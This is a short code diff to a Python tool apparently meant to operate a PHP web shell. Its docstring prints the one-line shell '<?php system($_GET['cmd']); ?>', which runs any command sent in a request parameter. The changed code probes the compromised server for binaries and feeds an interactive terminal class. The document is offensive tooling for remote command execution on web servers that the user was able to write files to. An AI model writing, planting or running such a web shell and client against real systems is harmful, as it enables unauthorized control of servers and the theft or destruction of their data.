@@ -5,7 +5,7 @@
 
     It assumes the following is in place on whatever php script you were able to write:
 
-    <?php system($_REQUEST['cmd']); ?>
+    <?php system($_GET['cmd']); ?>
 """
 
 import requests
@@ -59,8 +59,8 @@ def check_for_binary(url, invoke_word, binary):
     """
     cmd_string = f"which {binary}"
     result = invoke_command(url, invoke_word, cmd_string)
-    if {binary} in result:
-        return result[0].strip()
+    if binary in result:
+        return result.strip()
     return None
 
 class Terminal(cmd.Cmd):
